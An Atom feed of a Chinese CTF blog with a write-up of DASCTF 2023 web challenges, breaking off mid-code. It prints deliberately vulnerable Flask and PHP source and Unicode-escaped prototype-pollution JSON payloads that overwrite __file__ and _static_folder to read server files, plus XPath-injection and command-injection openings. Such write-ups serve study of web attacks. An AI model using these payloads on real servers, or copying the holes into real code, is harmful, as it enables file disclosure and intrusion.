<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-07-26T06:38:49.719Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python原型链污染</title>
    <link href="https://ke1nys.github.io/posts/6893ad0d.html"/>
    <id>https://ke1nys.github.io/posts/6893ad0d.html</id>
    <published>2023-07-26T06:31:25.000Z</published>
    <updated>2023-07-26T06:38:49.719Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章是为了占位  </p><p>因为比赛的时候刚好遇到这里不会</p><p><img src="../images/image-20230726143731499.png" alt="image-20230726143731499"></p><p><a href="https://tttang.com/archive/1876/#toc__1">python原型链污染详解</a></p><p><code>Web -EzFlask</code>    这道题考察到了  </p><p>关于这道题的解在博客直接搜索这个比赛的wp就能看到了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为比赛的时候刚好遇到这里不会&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143731499.png&quot; alt=&quot;image-20230726143731499&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="Python原型链污染" scheme="https://ke1nys.github.io/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>XXE-xpath注入</title>
    <link href="https://ke1nys.github.io/posts/9d9aaae5.html"/>
    <id>https://ke1nys.github.io/posts/9d9aaae5.html</id>
    <published>2023-07-26T06:30:56.000Z</published>
    <updated>2023-07-26T06:36:27.528Z</updated>
    
    <content type="html"><![CDATA[<p>这里这篇文章是为了占位  </p><p>因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅</p><p><img src="../images/image-20230726143326525.png" alt="image-20230726143326525"></p><p><strong>考点是xxe的xpath盲注</strong>  </p><p><a href="https://www.cnblogs.com/backlion/p/8554749.html">xpath详解</a></p><p><a href="https://boogipop.com/2023/03/06/XXE%E6%B3%A8%E5%85%A5%E7%9A%84Remake%E4%B9%8B%E6%97%85/">xxe和xpath详解</a></p><p><code>WEB -MyPicDisk</code>       这道题考察到了</p><p>wp的话在这个比赛的wp上 </p><p>直接在博客上搜索就行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143326525.png&quot; alt=&quot;image-202307</summary>
      
    
    
    
    
    <category term="XXE-xpath注入" scheme="https://ke1nys.github.io/tags/XXE-xpath%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2023 &amp; 0X401-Web</title>
    <link href="https://ke1nys.github.io/posts/46437d33.html"/>
    <id>https://ke1nys.github.io/posts/46437d33.html</id>
    <published>2023-07-25T06:51:45.000Z</published>
    <updated>2023-07-29T08:07:25.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><p><a href="https://tttang.com/archive/1876/#toc_object">python原型链污染</a></p><p><img src="../images/image-20230725145530694.png" alt="image-20230725145530694"></p><p><strong>提供源码  开始审计</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726100732339.png" alt="image-20230726100732339"></p><p>重点是这里  访问根目录的时候会读取我们的内置方法  <strong>(<code>__file__</code>)</strong></p><p>这里的话我们就可以通过污染这个<strong>内置属性</strong> 来指定我们想要读取的文件</p><p><img src="../images/image-20230726101131131.png" alt="image-20230726101131131"></p><p>就是在/<code>register</code>这个路由下  传入我们恶意构造的<code>json</code>语句</p><p>(<strong>这里有疑问的也可以去看看文章开头给的那篇文章)</strong></p><p>但是直接用文章给的<code>payload</code>是打不了的   因为有fuzz  但是因为这个<code>python</code>的<code>paylaod</code>和<code>ssti</code>差不多   所以可以使用编码来进行绕过</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;</span>:<span class="string">&quot;/proc/self/cgroup&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726101709961.png" alt="image-20230726101709961"></p><p>然后访问根目录  </p><p><img src="../images/image-20230726101758153.png" alt="image-20230726101758153"></p><p>这是个非预期解  </p><p><strong>其实看了文章开头给的文章的话  还可以污染另一个内置方法来直接读取文件</strong></p><p><img src="../images/image-20230726102006243.png" alt="image-20230726102006243"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__init\u005f_&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;&#125;&#125;,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是通过污染<code>_static_folder</code> 这个属性   <strong>来将当前目录设为根目录</strong></p><p>然后就可以直接进行目录穿越了</p><p><img src="../images/image-20230726102943214.png" alt="image-20230726102943214"></p><p>然后直接开始访问</p><p><img src="../images/image-20230726103038744.png" alt="image-20230726103038744"></p><p>都是可以直接访问的</p><p><img src="../images/image-20230726103154504.png" alt="image-20230726103154504"></p><p>这次比赛好几道题都可以这样来解  就是通过读取这个路径  来看docker的启动的sh文件内容  从而查到flag位置</p><p>就是存在两种可以污染的内置属性(<strong>可能还有其他的  但是我还不知道</strong>)</p><p>因为<code>console</code>开了  预期解是因为污染<code>__file__</code>   然后通过读取文件来算pin 然后再到控制台了读取文件</p><p><strong>(这里就不跟了)</strong></p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p><img src="../images/image-20230726104245789.png" alt="image-20230726104245789"></p><p>万能密码登录  然后看到隐藏文件  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span 